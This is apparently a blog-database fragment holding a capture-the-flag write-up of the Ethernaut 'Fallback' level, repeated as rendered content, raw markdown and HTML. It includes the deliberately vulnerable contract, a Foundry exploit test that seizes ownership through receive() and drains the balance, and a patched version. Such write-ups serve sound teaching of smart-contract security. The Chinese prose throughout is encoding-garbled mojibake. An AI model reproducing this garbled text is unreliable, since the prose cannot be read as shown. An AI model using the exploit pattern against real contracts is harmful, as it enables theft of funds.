æ–‡æ¡£</a></strong></li>\n</ul>\n<h2 id=\"ğŸš¨-å…è´£å£°æ˜\"><a href=\"#ğŸš¨-å…è´£å£°æ˜\" class=\"headerlink\" title=\"ğŸš¨ å…è´£å£°æ˜\"></a>ğŸš¨ å…è´£å£°æ˜</h2><p>æœ¬ç³»åˆ—æ–‡ç« çº¯å±æ•™è‚²ç›®çš„ï¼Œæ‰€æœ‰å†…å®¹ä»…ç”¨äºï¼š</p>\n<ul>\n<li>å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨çŸ¥è¯†</li>\n<li>ç†è§£å¸¸è§æ¼æ´æ¨¡å¼</li>\n<li>æé«˜ä»£ç å®¡è®¡èƒ½åŠ›</li>\n</ul>\n<p>è¯·å‹¿å°†ç›¸å…³æŠ€æœ¯ç”¨äºæ”»å‡»çœŸå®çš„æ™ºèƒ½åˆçº¦æˆ–è¿›è¡Œä»»ä½•éæ³•æ´»åŠ¨ã€‚</p>\n<h2 id=\"ğŸ¤-è´¡çŒ®ä¸åé¦ˆ\"><a href=\"#ğŸ¤-è´¡çŒ®ä¸åé¦ˆ\" class=\"headerlink\" title=\"ğŸ¤ è´¡çŒ®ä¸åé¦ˆ\"></a>ğŸ¤ è´¡çŒ®ä¸åé¦ˆ</h2><p>å¦‚æœä½ å‘ç°ä»»ä½•é—®é¢˜æˆ–æœ‰æ”¹è¿›å»ºè®®ï¼Œæ¬¢è¿ï¼š</p>\n<ul>\n<li>åœ¨ GitHub æäº¤ Issue</li>\n<li>å‘èµ· Pull Request</li>\n<li>åœ¨è¯„è®ºåŒºè®¨è®º</li>\n</ul>\n<hr>\n<p><em>è®©æˆ‘ä»¬ä¸€èµ·æ„å»ºæ›´å®‰å…¨çš„ Web3 ä¸–ç•Œï¼</em> ğŸŒŸ</p>\n"},{"title":"Ethernaut Level 1: Fallback - å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»","date":"2025-01-25T06:10:00.000Z","updated":"2025-01-25T06:10:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"å­¦ä¹ å¦‚ä½•åˆ©ç”¨ Fallback å‡½æ•°çš„æƒé™éªŒè¯æ¼æ´å®ç°åˆçº¦æ§åˆ¶æƒè·å–ï¼Œè¿™æ˜¯ Ethernaut ç³»åˆ—çš„ç¬¬ä¸€ä¸ªåŸºç¡€æ”»å‡»æŠ€æœ¯ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 1: Fallback - å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 1 - Fallback](https://ethernaut.openzeppelin.com/level/1)  \n> **æ”»å‡»ç±»å‹**: æƒé™æå‡ã€Fallback å‡½æ•°æ¼æ´  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™æ˜¯ Ethernaut ç³»åˆ—çš„ç¬¬ä¸€ä¸ªæ­£å¼å…³å¡ï¼Œç›®æ ‡éå¸¸æ˜ç¡®ï¼š\n\n1. **è·å–åˆçº¦æ§åˆ¶æƒ** - æˆä¸ºåˆçº¦çš„ `owner`\n2. **è½¬å‡ºæ‰€æœ‰ä½™é¢** - æå–åˆçº¦ä¸­çš„æ‰€æœ‰ ETH\n\n![Fallback Challenge](https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\né¦–å…ˆï¼Œæˆ‘ä»¬æ¥åˆ†æç›®æ ‡åˆçº¦çš„å…³é”®ä»£ç ï¼š\n\n```solidity\ncontract Fallback {\n    mapping(address => uint) public contributions;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if(contributions[msg.sender] > contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n\n    function getContribution() public view returns (uint) {\n        return contributions[msg.sender];\n    }\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n\n    // ğŸš¨ å…³é”®æ¼æ´ç‚¹\n    receive() external payable {\n        require(msg.value > 0 && contributions[msg.sender] > 0);\n        owner = msg.sender;\n    }\n\n    function getOwner() public view returns (address) {\n        return owner;\n    }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\né€šè¿‡ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸¤ç§æˆä¸º `owner` çš„æ–¹å¼ï¼š\n\n**æ–¹å¼ä¸€ï¼šé€šè¿‡ `contribute()` å‡½æ•°**\n- éœ€è¦è´¡çŒ®è¶…è¿‡ 1000 ETH æ‰èƒ½è·å¾—æ§åˆ¶æƒ\n- æ¯æ¬¡è°ƒç”¨é™åˆ¶æœ€å¤š 0.001 ETH\n- éœ€è¦è°ƒç”¨è¶…è¿‡ 100 ä¸‡æ¬¡ï¼Œæˆæœ¬è¿‡é«˜ âŒ\n\n**æ–¹å¼äºŒï¼šé€šè¿‡ `receive()` å‡½æ•°** â­\n- åªéœ€æ»¡è¶³ä¸¤ä¸ªç®€å•æ¡ä»¶ï¼š\n  1. `msg.value > 0` - å‘é€ä»»æ„æ•°é‡çš„ ETH\n  2. `contributions[msg.sender] > 0` - ä¹‹å‰æœ‰è¿‡è´¡çŒ®è®°å½•\n- æ»¡è¶³æ¡ä»¶åç›´æ¥æˆä¸º `owner` âœ…\n\n### æ”»å‡»è·¯å¾„\n\n1. **å»ºç«‹è´¡çŒ®è®°å½•** - è°ƒç”¨ `contribute()` å‘é€å°‘é‡ ETH\n2. **è§¦å‘æƒé™æå‡** - ç›´æ¥å‘åˆçº¦å‘é€ ETH è§¦å‘ `receive()`\n3. **æå–èµ„é‡‘** - è°ƒç”¨ `withdraw()` æå–æ‰€æœ‰ä½™é¢\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Fallback.sol\";\n\ncontract FallbackTest is Test {\n    Fallback public instance;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        instance = new Fallback();\n        \n        // ç»™æ”»å‡»è€…ä¸€äº›åˆå§‹èµ„é‡‘\n        vm.deal(attacker, 1 ether);\n        \n        // ç»™åˆçº¦ä¸€äº›åˆå§‹ä½™é¢\n        vm.deal(address(instance), 1 ether);\n    }\n\n    function testFallbackExploit() public {\n        vm.startPrank(attacker);\n        \n        // æ­¥éª¤1: å…ˆè´¡çŒ®å°‘é‡ETHä»¥æ»¡è¶³contributions[msg.sender] > 0\n        instance.contribute{value: 0.0001 ether}();\n        \n        // éªŒè¯è´¡çŒ®è®°å½•\n        assertGt(instance.getContribution(), 0);\n        \n        // æ­¥éª¤2: ç›´æ¥å‘åˆçº¦å‘é€ETHè§¦å‘receive()å‡½æ•°\n        (bool sent, ) = address(instance).call{value: 1 wei}(\"\");\n        require(sent, \"Failed to send Ether to the Fallback\");\n        \n        // éªŒè¯å·²æˆä¸ºowner\n        assertEq(instance.getOwner(), attacker);\n        \n        // æ­¥éª¤3: æå–æ‰€æœ‰èµ„é‡‘\n        uint256 initialBalance = attacker.balance;\n        instance.withdraw();\n        \n        // éªŒè¯èµ„é‡‘æå–æˆåŠŸ\n        assertGt(attacker.balance, initialBalance);\n        assertEq(address(instance).balance, 0);\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œ Fallback å…³å¡æµ‹è¯•\nforge test --match-contract FallbackTest -vvv\n\n# è¾“å‡ºåº”è¯¥æ˜¾ç¤ºæ‰€æœ‰æ–­è¨€é€šè¿‡\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### é—®é¢˜æ ¹æº\n\n1. **æƒé™æ£€æŸ¥ä¸å½“** - `receive()` å‡½æ•°ä¸­æ²¡æœ‰é€‚å½“çš„æƒé™éªŒè¯\n2. **é€»è¾‘è®¾è®¡ç¼ºé™·** - å…è®¸é€šè¿‡ç®€å•æ¡ä»¶è·å¾—å®Œæ•´æ§åˆ¶æƒ\n3. **å‡½æ•°èŒè´£æ··ä¹±** - æ¥æ”¶èµ„é‡‘çš„å‡½æ•°ä¸åº”åŒ…å«æƒé™å˜æ›´é€»è¾‘\n\n### å®‰å…¨ä¿®å¤å»ºè®®\n\n```solidity\ncontract SecureFallback {\n    mapping(address => uint) public contributions;\n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        \n        // âœ… æé«˜é—¨æ§›ï¼Œé¿å…ç®€å•çš„æƒé™æå‡\n        if(contributions[msg.sender] > contributions[owner] && \n           contributions[msg.sender] > 10 ether) {\n            owner = msg.sender;\n        }\n    }\n    \n    // âœ… ç§»é™¤æƒé™å˜æ›´é€»è¾‘ï¼Œåªå¤„ç†èµ„é‡‘æ¥æ”¶\n    receive() external payable {\n        // ä»…è®°å½•æ¥æ”¶çš„èµ„é‡‘ï¼Œä¸ä¿®æ”¹æƒé™\n        emit FundsReceived(msg.sender, msg.value);\n    }\n    \n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n    \n    event FundsReceived(address sender, uint amount);\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. Fallback å’Œ Receive å‡½æ•°\n\n```solidity\n// receive() - æ¥æ”¶çº¯ETHè½¬è´¦æ—¶è°ƒç”¨\nreceive() external payable {\n    // å¤„ç†é€»è¾‘\n}\n\n// fallback() - è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°æˆ–å¸¦æ•°æ®çš„ETHè½¬è´¦æ—¶è°ƒç”¨\nfallback() external payable {\n    // å¤„ç†é€»è¾‘\n}\n```\n\n### 2. æƒé™è®¾è®¡åŸåˆ™\n\n- **æœ€å°æƒé™åŸåˆ™** - ç»™äºˆæœ€å°‘å¿…è¦çš„æƒé™\n- **æƒé™åˆ†ç¦»** - ä¸åŒåŠŸèƒ½ä½¿ç”¨ä¸åŒæƒé™çº§åˆ«\n- **æƒé™æ£€æŸ¥** - åœ¨å…³é”®æ“ä½œå‰è¿›è¡Œå……åˆ†éªŒè¯\n\n### 3. å®‰å…¨å¼€å‘æœ€ä½³å®è·µ\n\n- **é¿å…åœ¨ç‰¹æ®Šå‡½æ•°ä¸­å®ç°å…³é”®é€»è¾‘**\n- **ä½¿ç”¨ OpenZeppelin çš„ Ownable æ¨¡å¼**\n- **å……åˆ†çš„å•å…ƒæµ‹è¯•è¦†ç›–**\n- **ä»£ç å®¡è®¡å’ŒåŒè¡Œè¯„å®¡**\n\n## ğŸ¯ æ€»ç»“\n\nFallback å…³å¡è™½ç„¶ç®€å•ï¼Œä½†å±•ç¤ºäº†æ™ºèƒ½åˆçº¦å®‰å…¨çš„åŸºç¡€æ¦‚å¿µï¼š\n\n- âœ… **å‡½æ•°èŒè´£åˆ†ç¦»çš„é‡è¦æ€§**\n- âœ… **æƒé™éªŒè¯çš„å¿…è¦æ€§** \n- âœ… **ç‰¹æ®Šå‡½æ•°çš„ä½¿ç”¨æ³¨æ„äº‹é¡¹**\n- âœ… **Foundry æµ‹è¯•æ¡†æ¶çš„åŸºæœ¬ä½¿ç”¨**\n\nè¿™æ˜¯å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨çš„è‰¯å¥½èµ·ç‚¹ï¼Œä¸ºåç»­æ›´å¤æ‚çš„æ”»å‡»æŠ€æœ¯æ‰“ä¸‹åŸºç¡€ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸‹ä¸€å…³: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œä¸­ï¼Œæœ€ç®€å•çš„æ¼æ´å¾€å¾€éšè—ç€æœ€æ·±åˆ»çš„å®‰å…¨æ•™è®­ã€‚* ğŸ“","source":"_posts/ethernaut-level-01-fallback.md","raw":"---\ntitle: 'Ethernaut Level 1: Fallback - å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»'\ndate: 2025-01-25 14:10:00\nupdated: 2025-01-25 14:10:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - Fallback\n  - æƒé™æå‡\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"å­¦ä¹ å¦‚ä½•åˆ©ç”¨ Fallback å‡½æ•°çš„æƒé™éªŒè¯æ¼æ´å®ç°åˆçº¦æ§åˆ¶æƒè·å–ï¼Œè¿™æ˜¯ Ethernaut ç³»åˆ—çš„ç¬¬ä¸€ä¸ªåŸºç¡€æ”»å‡»æŠ€æœ¯ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 1: Fallback - å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 1 - Fallback](https://ethernaut.openzeppelin.com/level/1)  \n> **æ”»å‡»ç±»å‹**: æƒé™æå‡ã€Fallback å‡½æ•°æ¼æ´  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™æ˜¯ Ethernaut ç³»åˆ—çš„ç¬¬ä¸€ä¸ªæ­£å¼å…³å¡ï¼Œç›®æ ‡éå¸¸æ˜ç¡®ï¼š\n\n1. **è·å–åˆçº¦æ§åˆ¶æƒ** - æˆä¸ºåˆçº¦çš„ `owner`\n2. **è½¬å‡ºæ‰€æœ‰ä½™é¢** - æå–åˆçº¦ä¸­çš„æ‰€æœ‰ ETH\n\n![Fallback Challenge](https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\né¦–å…ˆï¼Œæˆ‘ä»¬æ¥åˆ†æç›®æ ‡åˆçº¦çš„å…³é”®ä»£ç ï¼š\n\n```solidity\ncontract Fallback {\n    mapping(address => uint) public contributions;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if(contributions[msg.sender] > contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n\n    function getContribution() public view returns (uint) {\n        return contributions[msg.sender];\n    }\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n\n    // ğŸš¨ å…³é”®æ¼æ´ç‚¹\n    receive() external payable {\n        require(msg.value > 0 && contributions[msg.sender] > 0);\n        owner = msg.sender;\n    }\n\n    function getOwner() public view returns (address) {\n        return owner;\n    }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\né€šè¿‡ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸¤ç§æˆä¸º `owner` çš„æ–¹å¼ï¼š\n\n**æ–¹å¼ä¸€ï¼šé€šè¿‡ `contribute()` å‡½æ•°**\n- éœ€è¦è´¡çŒ®è¶…è¿‡ 1000 ETH æ‰èƒ½è·å¾—æ§åˆ¶æƒ\n- æ¯æ¬¡è°ƒç”¨é™åˆ¶æœ€å¤š 0.001 ETH\n- éœ€è¦è°ƒç”¨è¶…è¿‡ 100 ä¸‡æ¬¡ï¼Œæˆæœ¬è¿‡é«˜ âŒ\n\n**æ–¹å¼äºŒï¼šé€šè¿‡ `receive()` å‡½æ•°** â­\n- åªéœ€æ»¡è¶³ä¸¤ä¸ªç®€å•æ¡ä»¶ï¼š\n  1. `msg.value > 0` - å‘é€ä»»æ„æ•°é‡çš„ ETH\n  2. `contributions[msg.sender] > 0` - ä¹‹å‰æœ‰è¿‡è´¡çŒ®è®°å½•\n- æ»¡è¶³æ¡ä»¶åç›´æ¥æˆä¸º `owner` âœ…\n\n### æ”»å‡»è·¯å¾„\n\n1. **å»ºç«‹è´¡çŒ®è®°å½•** - è°ƒç”¨ `contribute()` å‘é€å°‘é‡ ETH\n2. **è§¦å‘æƒé™æå‡** - ç›´æ¥å‘åˆçº¦å‘é€ ETH è§¦å‘ `receive()`\n3. **æå–èµ„é‡‘** - è°ƒç”¨ `withdraw()` æå–æ‰€æœ‰ä½™é¢\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Fallback.sol\";\n\ncontract FallbackTest is Test {\n    Fallback public instance;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        instance = new Fallback();\n        \n        // ç»™æ”»å‡»è€…ä¸€äº›åˆå§‹èµ„é‡‘\n        vm.deal(attacker, 1 ether);\n        \n        // ç»™åˆçº¦ä¸€äº›åˆå§‹ä½™é¢\n        vm.deal(address(instance), 1 ether);\n    }\n\n    function testFallbackExploit() public {\n        vm.startPrank(attacker);\n        \n        // æ­¥éª¤1: å…ˆè´¡çŒ®å°‘é‡ETHä»¥æ»¡è¶³contributions[msg.sender] > 0\n        instance.contribute{value: 0.0001 ether}();\n        \n        // éªŒè¯è´¡çŒ®è®°å½•\n        assertGt(instance.getContribution(), 0);\n        \n        // æ­¥éª¤2: ç›´æ¥å‘åˆçº¦å‘é€ETHè§¦å‘receive()å‡½æ•°\n        (bool sent, ) = address(instance).call{value: 1 wei}(\"\");\n        require(sent, \"Failed to send Ether to the Fallback\");\n        \n        // éªŒè¯å·²æˆä¸ºowner\n        assertEq(instance.getOwner(), attacker);\n        \n        // æ­¥éª¤3: æå–æ‰€æœ‰èµ„é‡‘\n        uint256 initialBalance = attacker.balance;\n        instance.withdraw();\n        \n        // éªŒè¯èµ„é‡‘æå–æˆåŠŸ\n        assertGt(attacker.balance, initialBalance);\n        assertEq(address(instance).balance, 0);\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œ Fallback å…³å¡æµ‹è¯•\nforge test --match-contract FallbackTest -vvv\n\n# è¾“å‡ºåº”è¯¥æ˜¾ç¤ºæ‰€æœ‰æ–­è¨€é€šè¿‡\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### é—®é¢˜æ ¹æº\n\n1. **æƒé™æ£€æŸ¥ä¸å½“** - `receive()` å‡½æ•°ä¸­æ²¡æœ‰é€‚å½“çš„æƒé™éªŒè¯\n2. **é€»è¾‘è®¾è®¡ç¼ºé™·** - å…è®¸é€šè¿‡ç®€å•æ¡ä»¶è·å¾—å®Œæ•´æ§åˆ¶æƒ\n3. **å‡½æ•°èŒè´£æ··ä¹±** - æ¥æ”¶èµ„é‡‘çš„å‡½æ•°ä¸åº”åŒ…å«æƒé™å˜æ›´é€»è¾‘\n\n### å®‰å…¨ä¿®å¤å»ºè®®\n\n```solidity\ncontract SecureFallback {\n    mapping(address => uint) public contributions;\n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        \n        // âœ… æé«˜é—¨æ§›ï¼Œé¿å…ç®€å•çš„æƒé™æå‡\n        if(contributions[msg.sender] > contributions[owner] && \n           contributions[msg.sender] > 10 ether) {\n            owner = msg.sender;\n        }\n    }\n    \n    // âœ… ç§»é™¤æƒé™å˜æ›´é€»è¾‘ï¼Œåªå¤„ç†èµ„é‡‘æ¥æ”¶\n    receive() external payable {\n        // ä»…è®°å½•æ¥æ”¶çš„èµ„é‡‘ï¼Œä¸ä¿®æ”¹æƒé™\n        emit FundsReceived(msg.sender, msg.value);\n    }\n    \n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n    \n    event FundsReceived(address sender, uint amount);\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. Fallback å’Œ Receive å‡½æ•°\n\n```solidity\n// receive() - æ¥æ”¶çº¯ETHè½¬è´¦æ—¶è°ƒç”¨\nreceive() external payable {\n    // å¤„ç†é€»è¾‘\n}\n\n// fallback() - è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°æˆ–å¸¦æ•°æ®çš„ETHè½¬è´¦æ—¶è°ƒç”¨\nfallback() external payable {\n    // å¤„ç†é€»è¾‘\n}\n```\n\n### 2. æƒé™è®¾è®¡åŸåˆ™\n\n- **æœ€å°æƒé™åŸåˆ™** - ç»™äºˆæœ€å°‘å¿…è¦çš„æƒé™\n- **æƒé™åˆ†ç¦»** - ä¸åŒåŠŸèƒ½ä½¿ç”¨ä¸åŒæƒé™çº§åˆ«\n- **æƒé™æ£€æŸ¥** - åœ¨å…³é”®æ“ä½œå‰è¿›è¡Œå……åˆ†éªŒè¯\n\n### 3. å®‰å…¨å¼€å‘æœ€ä½³å®è·µ\n\n- **é¿å…åœ¨ç‰¹æ®Šå‡½æ•°ä¸­å®ç°å…³é”®é€»è¾‘**\n- **ä½¿ç”¨ OpenZeppelin çš„ Ownable æ¨¡å¼**\n- **å……åˆ†çš„å•å…ƒæµ‹è¯•è¦†ç›–**\n- **ä»£ç å®¡è®¡å’ŒåŒè¡Œè¯„å®¡**\n\n## ğŸ¯ æ€»ç»“\n\nFallback å…³å¡è™½ç„¶ç®€å•ï¼Œä½†å±•ç¤ºäº†æ™ºèƒ½åˆçº¦å®‰å…¨çš„åŸºç¡€æ¦‚å¿µï¼š\n\n- âœ… **å‡½æ•°èŒè´£åˆ†ç¦»çš„é‡è¦æ€§**\n- âœ… **æƒé™éªŒè¯çš„å¿…è¦æ€§** \n- âœ… **ç‰¹æ®Šå‡½æ•°çš„ä½¿ç”¨æ³¨æ„äº‹é¡¹**\n- âœ… **Foundry æµ‹è¯•æ¡†æ¶çš„åŸºæœ¬ä½¿ç”¨**\n\nè¿™æ˜¯å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨çš„è‰¯å¥½èµ·ç‚¹ï¼Œä¸ºåç»­æ›´å¤æ‚çš„æ”»å‡»æŠ€æœ¯æ‰“ä¸‹åŸºç¡€ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸‹ä¸€å…³: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œä¸­ï¼Œæœ€ç®€å•çš„æ¼æ´å¾€å¾€éšè—ç€æœ€æ·±åˆ»çš„å®‰å…¨æ•™è®­ã€‚* ğŸ“","slug":"ethernaut-level-01-fallback","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbox0007bf5q5tek3nka","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-1-Fallback-å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-1-Fallback-å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 1: Fallback - å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 1: Fallback - å›é€€å‡½æ•°æƒé™æå‡æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/1\">Ethernaut Level 1 - Fallback</a><br><strong>æ”»å‡»ç±»å‹</strong>: æƒé™æå‡ã€Fallback å‡½æ•°æ¼æ´<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™æ˜¯ Ethernaut ç³»åˆ—çš„ç¬¬ä¸€ä¸ªæ­£å¼å…³å¡ï¼Œç›®æ ‡éå¸¸æ˜ç¡®ï¼š</p>\n<ol>\n<li><strong>è·å–åˆçº¦æ§åˆ¶æƒ</strong> - æˆä¸ºåˆçº¦çš„ <code>owner</code></li>\n<li><strong>è½¬å‡ºæ‰€æœ‰ä½™é¢</strong> - æå–åˆçº¦ä¸­çš„æ‰€æœ‰ ETH</li>\n</ol>\n<p><img src=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp\" alt=\"Fallback Challenge\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥åˆ†æç›®æ ‡åˆçº¦çš„å…³é”®ä»£ç ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Fallback &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public contributions;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function contribute() public payable &#123;</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether);</span><br><span class=\"line\">        contributions[msg.sender] += msg.value;</span><br><span class=\"line\">        if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function getContribution() public view returns (uint) &#123;</span><br><span class=\"line\">        return contributions[msg.sender];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public onlyOwner &#123;</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ğŸš¨ å…³é”®æ¼æ´ç‚¹</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class=\"line\">        owner = 